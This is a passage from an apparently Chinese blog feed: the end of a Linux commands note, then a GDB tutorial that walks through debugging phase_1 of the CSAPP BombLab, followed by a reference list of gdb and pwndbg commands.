<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="磁盘测速"><a href="#磁盘测速" class="headerlink" title="磁盘测速"></a>磁盘测速</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo hdparm -tT /dev/sdb2</span><br><span class="line"></span><br><span class="line">/dev/sdb2:</span><br><span class="line"> Timing cached reads:   31986 MB in  1.99 seconds = 16111.27 MB/sec</span><br><span class="line"> Timing buffered disk reads: 1308 MB in  3.00 seconds = 435.61 MB/sec</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="修改卷标"><a href="#修改卷标" class="headerlink" title="修改卷标"></a>修改卷标</h3><blockquote>
<p><a href="https://linux.cn/article-1978-1.html">https://linux.cn/article-1978-1.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo blkid -c /dev/null # 查看卷标信息</span><br><span class="line">sudo e2label /dev/sda3 Arch_home</span><br></pre></td></tr></table></figure>

<h3 id="视频合并"><a href="#视频合并" class="headerlink" title="视频合并"></a>视频合并</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S mencoder</span><br><span class="line">mencoder -ovc copy -oac mp3lame xxx.mkv xxxx.mkv -o out.mkv </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>折腾记</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB 使用指南</title>
    <url>/2022/09/01/GDB/</url>
    <content><![CDATA[<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><div class="note default"><p><strong><a href="https://zh.wikipedia.org/wiki/GNU%E4%BE%A6%E9%94%99%E5%99%A8">Wikipedia</a></strong></p>
<p>GNU调试器（英语：GNU Debugger，缩写：GDB），是GNU软件系统中的标准调试器，此外GDB也是个具有移携性的调试器，经过移携需求的调修与重新编译，如今许多的类UNIX操作系统上都可以使用GDB，而现有GDB所能支持调试的编程语言有C、C++、Pascal以及FORTRAN。</p>
</div>

<blockquote>
<p>相关链接: <a href="https://www.sourceware.org/gdb/">GDB: The GNU Project Debugger</a></p>
</blockquote>
<details class="note info"><summary><p>本文参考资料</p>
</summary>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">GDBNotes</a></li>
<li><a href="https://sourceware.org/gdb/onlinedocs/gdb/">Debugging with GDB</a></li>
<li><a href="https://evilpan.com/2020/09/13/gdb-tips/">GDB的那些奇淫技巧-evilpan</a></li>
</ul>

</details>

<h2 id="GDB-的基本使用"><a href="#GDB-的基本使用" class="headerlink" title="GDB 的基本使用"></a>GDB 的基本使用</h2><p>接下来只涉及一小部分常用的命令，更多的常用命令查阅上面提到的参考资料</p>
<div class="note primary"><p><strong>💡 样例程序</strong><br>这里以 CSAPP 的 BombLab 的 phase_1 阶段为例：</p>
<ul>
<li>实验简介：只有在输入正确的字符串后才可避免💣爆炸，目标是正确拆除所有💣</li>
<li><a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf">实验说明书</a></li>
<li><a href="http://csapp.cs.cmu.edu/3e/bomb.tar">下载链接</a></li>
</ul>
</div>

<div class="note default"><p><strong>实验环境</strong></p>
<ul>
<li>Ubuntu 20.04 LTS</li>
<li>GDB Version: GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2</li>
<li>不安装 gef、peda、pwndbg 等</li>
</ul>
</div>

<h3 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h3><p>使用 GDB 调试目标程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ gdb bomb</span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from bomb...</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>此时目标程序尚未运行，不过可以使用 <code>info functions</code> 查看函数符号表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">File bomb.c:</span><br><span class="line"><span class="number">36</span>:	<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span>, <span class="type">char</span> **)</span>;</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line"><span class="number">0x0000000000400ac0</span>  _init</span><br><span class="line"><span class="number">0x0000000000400ae0</span>  getenv@plt</span><br><span class="line"><span class="number">0x0000000000400af0</span>  __errno_location@plt</span><br><span class="line"><span class="number">0x0000000000400b00</span>  <span class="built_in">strcpy</span>@plt</span><br><span class="line">...</span><br><span class="line"><span class="number">0x0000000000400ee0</span>  phase_1</span><br><span class="line"><span class="number">0x0000000000400efc</span>  phase_2</span><br><span class="line"><span class="number">0x0000000000400f43</span>  phase_3</span><br><span class="line"><span class="number">0x0000000000400fce</span>  func4</span><br><span class="line"><span class="number">0x000000000040100c</span>  phase_4</span><br><span class="line"><span class="number">0x0000000000401062</span>  phase_5</span><br><span class="line"><span class="number">0x00000000004010f4</span>  phase_6</span><br><span class="line"><span class="number">0x0000000000401204</span>  fun7</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>使用 <code>disassemble</code> 命令(简写 disass)反编译指定的函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) disass phase_1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_1:</span><br><span class="line">   <span class="number">0x0000000000400ee0</span> &lt;+<span class="number">0</span>&gt;:	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x0000000000400ee4</span> &lt;+<span class="number">4</span>&gt;:	mov    $<span class="number">0x402400</span>,%esi</span><br><span class="line">   <span class="number">0x0000000000400ee9</span> &lt;+<span class="number">9</span>&gt;:	callq  <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x0000000000400eee</span> &lt;+<span class="number">14</span>&gt;:	test   %eax,%eax</span><br><span class="line">   <span class="number">0x0000000000400ef0</span> &lt;+<span class="number">16</span>&gt;:	je     <span class="number">0x400ef7</span> &lt;phase_1+<span class="number">23</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400ef2</span> &lt;+<span class="number">18</span>&gt;:	callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000400ef7</span> &lt;+<span class="number">23</span>&gt;:	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x0000000000400efb</span> &lt;+<span class="number">27</span>&gt;:	retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>此时的汇编语法是 AT&amp;T 风格的，可以使用 <code>set disassembly-flavor intel</code> 切换至 intel 风格：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> disassembly-flavor <span class="title function_">intel</span></span><br><span class="line"><span class="params">(gdb)</span> disass phase_1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:	sub    rsp,0x8</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:	mov    esi,0x402400</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:	call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:	test   eax,eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:	call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:	add    rsp,0x8</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<details class="note success"><summary><p>📌 AT&amp;T 与 intel 语法有何区别？</p>
</summary>
<p><a href="https://timothyqiu.com/archives/difference-between-att-and-intel-asm-syntax/">AT&amp;T 和 Intel 汇编语法的主要区别</a></p>

</details>

<blockquote>
<p>后续内容默认使用 intel 汇编语法</p>
</blockquote>
<p>使用 break 命令添加断点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) b phase_1</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x400ee0</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<div class="note default"><p><strong>break 命令</strong></p>
<ul>
<li>可以直接在指定地址处下断点： <code>break *0x400ee0</code></li>
<li>也可以在已知的函数符号后加一定的偏移处下断点： <code>break *main+10</code></li>
</ul>
</div>

<div class="note default"><p><strong>断点相关</strong></p>
<ul>
<li>查看已经存在的断点信息： <code>info breakpoints</code></li>
<li>删除指定断点：<code>del 1</code></li>
</ul>
</div>

<p>使用 <code>run</code> 或 <code>start</code> 命令启动程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: /home/ubuntu/Datas/study/bomb/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have <span class="number">6</span> phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">ABCD  <span class="comment">// 这里是输入的内容</span></span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0000000000400ee0</span> in <span class="title function_">phase_1</span> <span class="params">()</span></span><br><span class="line"><span class="params">(gdb)</span></span><br></pre></td></tr></table></figure>

<details class="note success"><summary><p>📌 <code>run</code> 与 <code>start</code> 命令的区别是什么？</p>
</summary>
<ul>
<li><code>run</code> 会一直执行程序，直到执行到设置的断点处停下；</li>
<li><code>start</code> 会执行程序到 <code>main()</code> 函数起始处停下，等同于先执行了 <code>break main</code> 后执行 <code>run</code></li>
</ul>

</details>

<h3 id="分析-phase-1"><a href="#分析-phase-1" class="headerlink" title="分析 phase_1"></a>分析 phase_1</h3><p>执行 disass，会反汇编得到当前断点处所在的函数（<code>phase_1</code>）的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) disass</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_1:</span><br><span class="line">=&gt; <span class="number">0x0000000000400ee0</span> &lt;+<span class="number">0</span>&gt;:	sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000400ee4</span> &lt;+<span class="number">4</span>&gt;:	mov    esi,<span class="number">0x402400</span>  <span class="comment">// 这里可以看到第二个参数传递了一个全局变量地址</span></span><br><span class="line">   <span class="number">0x0000000000400ee9</span> &lt;+<span class="number">9</span>&gt;:	call   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x0000000000400eee</span> &lt;+<span class="number">14</span>&gt;:	test   eax,eax</span><br><span class="line">   <span class="number">0x0000000000400ef0</span> &lt;+<span class="number">16</span>&gt;:	je     <span class="number">0x400ef7</span> &lt;phase_1+<span class="number">23</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400ef2</span> &lt;+<span class="number">18</span>&gt;:	call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000400ef7</span> &lt;+<span class="number">23</span>&gt;:	add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000400efb</span> &lt;+<span class="number">27</span>&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>第一个参数则是会通过 rdi 寄存器进行传参，接下来查看 rdi 的值：</p>
<ul>
<li>使用 <code>info reg</code> 可以查看当前的所有寄存器信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) info reg</span><br><span class="line">rax            <span class="number">0x603780</span>            <span class="number">6305664</span></span><br><span class="line">rbx            <span class="number">0x402210</span>            <span class="number">4203024</span></span><br><span class="line">rcx            <span class="number">0x4</span>                 <span class="number">4</span></span><br><span class="line">rdx            <span class="number">0x1</span>                 <span class="number">1</span></span><br><span class="line">rsi            <span class="number">0x603780</span>            <span class="number">6305664</span></span><br><span class="line">rdi            <span class="number">0x603780</span>            <span class="number">6305664</span></span><br><span class="line">rbp            <span class="number">0x0</span>                 <span class="number">0x0</span></span><br><span class="line">rsp            <span class="number">0x7fffffffe348</span>      <span class="number">0x7fffffffe348</span></span><br><span class="line">r8             <span class="number">0x603780</span>            <span class="number">6305664</span></span><br><span class="line">r9             <span class="number">0x7c</span>                <span class="number">124</span></span><br><span class="line">r10            <span class="number">0xfffffffffffffe34</span>  <span class="number">-460</span></span><br><span class="line">r11            <span class="number">0x7ffff7e004a0</span>      <span class="number">140737352041632</span></span><br><span class="line">r12            <span class="number">0x400c90</span>            <span class="number">4197520</span></span><br><span class="line">r13            <span class="number">0x7fffffffe440</span>      <span class="number">140737488348224</span></span><br><span class="line">r14            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">r15            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">rip            <span class="number">0x400ee0</span>            <span class="number">0x400ee0</span> &lt;phase_1&gt;</span><br><span class="line">eflags         <span class="number">0x206</span>               [ PF IF ]</span><br><span class="line">cs             <span class="number">0x33</span>                <span class="number">51</span></span><br><span class="line">ss             <span class="number">0x2b</span>                <span class="number">43</span></span><br><span class="line">ds             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">es             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">fs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">gs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<ul>
<li>或者使用 <code>print</code> 来输出当前的 rdi 寄存器值：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) print /x $rdi   <span class="comment">// 以十六进制形式打印 rdi 寄存器的值</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x603780</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>使用 x 命令打印出其中的字符串内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0x603780</span>    <span class="comment">// 打印出指定地址存储的字符串</span></span><br><span class="line"><span class="number">0x603780</span> &lt;input_strings&gt;:	<span class="string">&quot;ABCD&quot;</span></span><br><span class="line"><span class="comment">// 一并打印下第二个参数指向的数据内容：</span></span><br><span class="line">(gdb) x/s <span class="number">0x402400</span></span><br><span class="line"><span class="number">0x402400</span>:	<span class="string">&quot;Border relations with Canada have never been better.&quot;</span></span><br></pre></td></tr></table></figure>

<details class="note default"><summary><p><strong>print 与 x 命令的更多帮助信息</strong></p>
</summary>
<ul>
<li>可以直接使用 help 命令查询：<ul>
<li>例如: <code>help x</code></li>
</ul>
</li>
<li>查询GDB手册<ul>
<li>例如：<a href="https://sourceware.org/gdb/onlinedocs/gdb/Memory.html">Examining Menory - command <code>x</code></a></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) help x</span><br><span class="line">Examine memory: x/FMT ADDRESS.</span><br><span class="line">ADDRESS is an expression for the memory address to examine.</span><br><span class="line">FMT is a repeat count followed by a format letter and a size letter.</span><br><span class="line">Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),</span><br><span class="line">  t(binary), f(float), a(address), i(instruction), c(char), s(string)</span><br><span class="line">  and z(hex, zero padded on the left).</span><br><span class="line">Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).</span><br><span class="line">The specified number of objects of the specified size are printed</span><br><span class="line">according to the format.  If a negative number is specified, memory is</span><br><span class="line">examined backward from the address.</span><br><span class="line"></span><br><span class="line">Defaults for format and size letters are those previously used.</span><br><span class="line">Default count is 1.  Default address is following last thing printed</span><br><span class="line">with this command or &quot;print&quot;.</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x/nfu addr</span><br><span class="line"></span><br><span class="line">n: 输出单元的个数</span><br><span class="line">f: 输出单元的格式     o/x/d/u/t/f/a/i/c/s/z</span><br><span class="line">u: 每个输出单元的长度  b/h/w/g</span><br></pre></td></tr></table></figure>
</details>

<div class="note default"><p><strong>打印栈上的数据</strong><br>我们也可以使用 x 命令来打印栈的数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">10</span>gx $rsp</span><br><span class="line"><span class="number">0x7fffffffe348</span>:	<span class="number">0x0000000000400e3f</span>	<span class="number">0x0000000000402210</span></span><br><span class="line"><span class="number">0x7fffffffe358</span>:	<span class="number">0x00007ffff7df0083</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe368</span>:	<span class="number">0x00007fffffffe448</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x7fffffffe378</span>:	<span class="number">0x0000000000400da0</span>	<span class="number">0x0000000000402210</span></span><br><span class="line"><span class="number">0x7fffffffe388</span>:	<span class="number">0x4f838435c81d5e78</span>	<span class="number">0x0000000000400c90</span></span><br></pre></td></tr></table></figure></div>

<p>比较明显的可以得知，接下来程序会对比这两个字符串是否一致，一致时💣可以被解除</p>
<p>重新执行 run，输入刚刚发现的目标字符串</p>
<p>为了方便调试，可以执行 <code>layout regs</code> 来切换到下面的布局：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220901172524.png" alt="Pasted image 20220901172524"></p>
<div class="note default"><p><strong>tui 相关</strong><br><a href="https://sourceware.org/gdb/onlinedocs/gdb/TUI.html">GDB手册 - GDB Text User Interface</a></p>
<ul>
<li>关闭上面的界面，回归正常模式: <code>tui disable</code></li>
</ul>
</div>

<p>进行单步执行：<code>stepi</code> &#x2F; <code>nexti</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220901173832.png" alt="Pasted image 20220901173832"></p>
<p>函数返回值存储在 rax 中，值为 0 表示两个字符串相等，然后会跳过 <code>explode_bomb</code> 函数，继续执行程序</p>
<details class="note success"><summary><p>📌 <code>stepi</code> 与 <code>nexti</code> 的区别是什么？</p>
</summary>
<ul>
<li>stepi(si)：执行一条指令，遇到函数调用时进入函数内部</li>
<li>nexti(ni)：类似于stepi，但是遇到函数调用时不会进入，直接跳过</li>
</ul>

</details>

<p>继续执行程序 <code>continue</code>，可以发现💣解除了一个：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase <span class="number">1</span> defused. How about the next one?</span><br></pre></td></tr></table></figure>


<h2 id="GDB-Pwndbg-常用命令"><a href="#GDB-Pwndbg-常用命令" class="headerlink" title="GDB + Pwndbg 常用命令"></a>GDB + Pwndbg 常用命令</h2><p>整理一下 gdb + pwndbg 的一些常用命令</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb program</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行程序，简写r</span></span><br><span class="line">(gdb) run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">带参数运行程序(method 1)</span></span><br><span class="line">(gdb) run arg1 arg2 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">带参数运行程序(method 2)</span></span><br><span class="line">(gdb) set args arg1 arg2</span><br><span class="line">(gdb) run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定标准输入</span></span><br><span class="line">(gdb) run &lt;file</span><br><span class="line">(gdb) run &lt; &lt;(python3 -c &#x27;print(b&quot;A&quot;*10)&#x27;)</span><br><span class="line">(gdb) run &lt;&lt;&lt;$(python3 -c &#x27;print(b&quot;A&quot;*10)&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">链接到正在运行的进程，并进行调试</span></span><br><span class="line">(gdb) attach &#123;process-id&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">断开链接</span></span><br><span class="line">(gdb) detach</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看历史命令</span></span><br><span class="line">(gdb) show commands</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行上一条命令</span></span><br><span class="line">(gdb) &lt;enter&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从文件中加载gdb命令</span></span><br><span class="line">(gdb) source &#123;filepath&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出gdb (简写q)</span></span><br><span class="line">(gdb) quit</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">帮助</span></span><br><span class="line">(gdb) help</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 pwndbg 命令帮助</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">pwndbg</span></span><br></pre></td></tr></table></figure>

<h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加断点(指定函数名)</span></span><br><span class="line">(gdb) break main</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加断点(指定内存地址)</span></span><br><span class="line">(gdb) break *0x00400123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出所有断点信息(简写info b)</span></span><br><span class="line">(gdb) info breakpoints </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除编号为1的断点</span></span><br><span class="line">(gdb) delete 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有断点(简写del)</span></span><br><span class="line">(gdb) delete</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除内存地址的断点</span></span><br><span class="line">(gdb) clear *0x00400123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用指定编号断点</span></span><br><span class="line">(gdb) disable 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用指定编号断点</span></span><br><span class="line">(gdb) enable 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">条件断点</span></span><br><span class="line">(gdb) condition &#123;id&#125; &#123;expr&#125;</span><br><span class="line">                  2   i == 10  # 只有在 i==10 成立时2号断点生效</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">继续执行(简写c)</span></span><br><span class="line">(gdb) continue</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单步进入(遇到函数会进入)</span></span><br><span class="line">(gdb) stepi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单步跳过(遇到函数不会进入)</span></span><br><span class="line">(gdb) nexti</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束当前函数</span></span><br><span class="line">(gdb) finish</span><br></pre></td></tr></table></figure>

<h3 id="源代码及反汇编"><a href="#源代码及反汇编" class="headerlink" title="源代码及反汇编"></a>源代码及反汇编</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看指定函数附近的代码</span></span><br><span class="line">(gdb) list main  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看指定地址的代码</span></span><br><span class="line">(gdb) list *0x00400800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加源代码搜索路径</span></span><br><span class="line">(gdb) dir &#123;dirpath&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复原源代码搜索路径</span></span><br><span class="line">(gdb) dir </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看源代码搜索路径</span></span><br><span class="line">(gdb) show directories</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印当前执行函数的汇编代码</span></span><br><span class="line">(gdb) disas</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印指定函数的反汇编代码</span></span><br><span class="line">(gdb) disas main</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对指定地址进行反汇编</span></span><br><span class="line">(gdb) disas &#123;address&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印程序中的函数</span></span><br><span class="line">(gdb) info functions</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改显示风格</span></span><br><span class="line">(gdb) set disassembly-flavor att</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认只显示源代码段</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> context-sections code</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示源代码段</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">ctx code</span> </span><br></pre></td></tr></table></figure>

<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印backtrace(简写bt)</span></span><br><span class="line">(gdb) backtrace</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印当前运行的栈帧</span></span><br><span class="line">(gdb) frame</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到指定编号的栈帧</span></span><br><span class="line">(gdb) frame &#123;id&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示当前函数参数</span></span><br><span class="line">(gdb) info args</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看栈数据</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack</span> </span><br></pre></td></tr></table></figure>

<h3 id="数据查看"><a href="#数据查看" class="headerlink" title="数据查看"></a>数据查看</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印出表达式结果</span></span><br><span class="line">(gdb) print &#123;expression&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">十六进制输出结果</span></span><br><span class="line">(gdb) print /x &#123;expr&#125;</span><br><span class="line">/x 十六进制</span><br><span class="line">/o 八进制</span><br><span class="line">/d 十进制</span><br><span class="line">/t 二进制 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印历史记录条目</span></span><br><span class="line">(gdb) print $1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印指定寄存器数据</span></span><br><span class="line">(gdb) print /x $rax</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从指定地址处读取数据</span></span><br><span class="line">(gdb) x/[数量][长度单位][显示格式] where</span><br><span class="line">长度单位:</span><br><span class="line">/b 以1字节为单位读取数据</span><br><span class="line">/w 以4字节为单位读取数据</span><br><span class="line">/g 以8字节为单位读取数据</span><br><span class="line"></span><br><span class="line">/i 尝试解析成汇编</span><br><span class="line"></span><br><span class="line">例如:</span><br><span class="line">(gdb) x/8gx $rsp+8</span><br><span class="line">0x7fffffffe478:	0x00007fffffffe6ef	0x0000000000000000</span><br><span class="line">0x7fffffffe488:	0x00007fffffffe70e	0x00007fffffffe729</span><br><span class="line">0x7fffffffe498:	0x00007fffffffe739	0x00007fffffffe74c</span><br><span class="line">0x7fffffffe4a8:	0x00007fffffffe758	0x00007fffffffe767</span><br><span class="line">(gdb) x/4wd $rsp+8</span><br><span class="line">0x7fffffffe478:	-6417	32767	0	0</span><br></pre></td></tr></table></figure>

